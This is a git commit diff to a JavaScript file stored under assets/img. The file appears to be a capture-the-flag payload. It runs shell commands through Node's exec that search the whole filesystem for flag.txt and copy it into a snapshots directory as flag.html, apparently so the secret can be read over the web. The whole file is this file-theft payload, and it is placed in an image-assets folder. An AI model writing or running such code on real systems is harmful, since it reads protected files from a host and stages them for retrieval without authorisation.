7098bbf382ac8dbcf418e9f1cd742794d6fabb8f
John <146613722+cattl3ya@users.noreply.github.com>
2026-02-21 15:32:51 -0600

    Update test.js

--- assets/img/test.js
+++ assets/img/test.js
@@ -1,11 +1,11 @@
 import { exec } from 'node:child_process';
 
-exec('mkdir /app/snapshots/11111', (err) => {
+exec('mkdir /app/snapshots/1111', (err) => {
   if (err) console.error('System copy failed', err);
   else console.log('Done');
 });
 // This runs the literal system 'cp' command
-exec('find / -name flag.txt -exec cp {} /app/snapshots/flag.txt \\; 2>/dev/null', (err) => {
+exec('find / -name flag.txt -exec cp {} /app/snapshots/1111/flag.html \\; 2>/dev/null', (err) => {
   if (err) console.error('System copy failed', err);
   else console.log('Done');
 });
